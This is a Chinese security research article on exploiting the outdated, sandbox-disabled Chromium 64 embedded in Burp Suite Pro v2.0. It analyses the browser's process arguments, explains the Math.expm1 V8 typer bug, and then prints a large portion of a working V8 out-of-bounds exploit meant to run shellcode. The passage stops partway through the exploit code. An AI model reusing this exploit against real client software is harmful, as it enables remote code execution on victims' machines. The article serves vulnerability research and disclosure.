**作者：Wfox  
原文链接：**
## 一、前言
Headless Chrome是谷歌Chrome浏览器的无界面模式，通过命令行方式打开网页并渲染，常用于自动化测试、网站爬虫、网站截图、XSS检测等场景。
近几年许多桌面客户端应用中，基本都内嵌了Chromium用于业务场景使用，但由于开发不当、CEF版本不升级维护等诸多问题，攻击者可以利用这些缺陷攻击客户端应用以达到命令执行效果。
本文以知名渗透软件Burp Suite举例，从软件分析、漏洞挖掘、攻击面扩展等方面进行深入探讨。
## 二、软件分析
以Burp Suite Pro v2.0beta版本为例，要做漏洞挖掘首先要了解软件架构及功能点。
将`burpsuite_pro_v2.0.11beta.jar`进行解包，可以发现Burp
Suite打包了Windows、Linux、Mac的Chromium，可以兼容在不同系统下运行内置Chromium浏览器。
在Windows系统中，Burp Suite v2.0运行时会将`chromium-win64.7z`解压至`C:\Users\user\AppData\Local\JxBrowser\browsercore-64.0.3282.24.unknown\`目录
从目录名及数字签名得知Burp Suite v2.0是直接引用JxBrowser浏览器控件，其打包的Chromium版本为64.0.3282.24。
那如何在Burp Suite中使用内置浏览器呢？在常见的使用场景中，`Proxy -> HTTP history -> Response ->
Render`及`Repeater -> Render`都能够调用内置Chromium浏览器渲染网页。
当Burp
Suite唤起内置浏览器`browsercore32.exe`打开网页时，`browsercore32.exe`会创建Renderer进程及GPU加速进程。
browsercore32.exe进程运行参数如下：
    // Chromium主进程
    C:\Users\user\AppData\Local\JxBrowser\browsercore-64.0.3282.24.unknown\browsercore32.exe --port=53070 --pid=13208 --dpi-awareness=system-aware --crash-dump-dir=C:\Users\user\AppData\Local\JxBrowser --lang=zh-CN --no-sandbox --disable-xss-auditor --headless --disable-gpu --log-level=2 --proxy-server="socks://127.0.0.1:0" --disable-bundled-ppapi-flash --disable-plugins-discovery --disable-default-apps --disable-extensions --disable-prerender-local-predictor --disable-save-password-bubble --disable-sync --disk-cache-size=0 --incognito --media-cache-size=0 --no-events --disable-settings-window
    // Renderer进程
    C:\Users\user\AppData\Local\JxBrowser\browsercore-64.0.3282.24.unknown\browsercore32.exe --type=renderer --log-level=2 --no-sandbox --disable-features=LoadingWithMojo,browser-side-navigation --disable-databases --disable-gpu-compositing --service-pipe-token=C06434E20AA8C9230D15FCDFE9C96993 --lang=zh-CN --crash-dump-dir="C:\Users\user\AppData\Local\JxBrowser" --enable-pinch --device-scale-factor=1 --num-raster-threads=1 --enable-gpu-async-worker-context --disable-accelerated-video-decode --service-request-channel-token=C06434E20AA8C9230D15FCDFE9C96993 --renderer-client-id=2 --mojo-platform-channel-handle=2564 /prefetch:1
从进程运行参数分析得知，Chromium进程以headless模式运行、关闭了沙箱功能、随机监听一个端口（用途未知）。
## 三、漏洞利用
Chromium组件的历史版本几乎都存在着1Day漏洞风险，特别是在客户端软件一般不会维护升级Chromium版本，且关闭沙箱功能，在没有沙箱防护的情况下漏洞可以无限制利用。
Burp Suite
v2.0内置的Chromium版本为64.0.3282.24，该低版本Chromium受到多个历史漏洞影响，可以通过v8引擎漏洞执行shellcode从而获得PC权限。
以Render功能演示，利用v8漏洞触发shellcode打开计算器（此处感谢Sakura提供漏洞利用代码）
这个漏洞没有公开的CVE
ID，但其详情可以在[这里](https://bugs.chromium.org/p/chromium/issues/detail?id=880207)找到。
该漏洞的Root Cause是在进行`Math.expm1`的范围分析时，推断出的类型是`Union(PlainNumber,
NaN)`，忽略了`Math.expm1(-0)`会返回`-0`的情况，从而导致范围分析错误，导致JIT优化时，错误的将边界检查CheckBounds移除，造成了OOB漏洞。
    function pwn() {
        var f64Arr = new Float64Array(1);
        var u32Arr = new Uint32Array(f64Arr.buffer);
        function f2u(f) {
            f64Arr[0] = f;
            return u32Arr;
        }
        function u2f(h, l)
        {
            u32Arr[0] = l;
            u32Arr[1] = h;
            return f64Arr[0];
        }
        function hex(i) {
            return "0x" + i.toString(16).padStart(8, "0");
        }
        function log(str) {
            console.log(str);
            document.body.innerText += str + '\n';
        }
        var big_arr = [1.1, 1.2];
        var ab = new ArrayBuffer(0x233);
        var data_view = new DataView(ab);
        function opt_me(x) {
            var oob_arr = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6];
            big_arr = [1.1, 1.2];
            ab = new ArrayBuffer(0x233);
            data_view = new DataView(ab);
            let obj = {
                a: -0
            };
            let idx = Object.is(Math.expm1(x), obj.a) * 10;
            var tmp = f2u(oob_arr[idx])[0];
            oob_arr[idx] = u2f(0x234, tmp);
        }
        for (let a = 0; a < 0x1000; a++)
            opt_me(0);
        opt_me(-0);
        var optObj = {
            flag: 0x266,
            funcAddr: opt_me
        };
        log("[+] big_arr.length: " + big_arr.length);
        if (big_arr.length != 282) {
            log("[-] Can not modify big_arr length !");
            return;
        }
        var backing_store_idx = -1;
        var backing_store_in_hign_mem = false;
        var OptObj_idx = -1;
        var OptObj_idx_in_hign_mem = false;
        for (let a = 0; a < 0x100; a++) {
            if (backing_store_idx == -1) {
                if (f2u(big_arr[a])[0] == 0x466) {
                    backing_store_in_hign_mem = true;
                    backing_store_idx = a;
                } else if (f2u(big_arr[a])[1] == 0x466) {
                    backing_store_in_hign_mem = false;
                    backing_store_idx = a + 1;
                }
            }
            else if (OptObj_idx == -1) {
                if (f2u(big_arr[a])[0] == 0x4cc) {
                    OptObj_idx_in_hign_mem = true;
                    OptObj_idx = a;
                } else if (f2u(big_arr[a])[1] == 0x4cc) {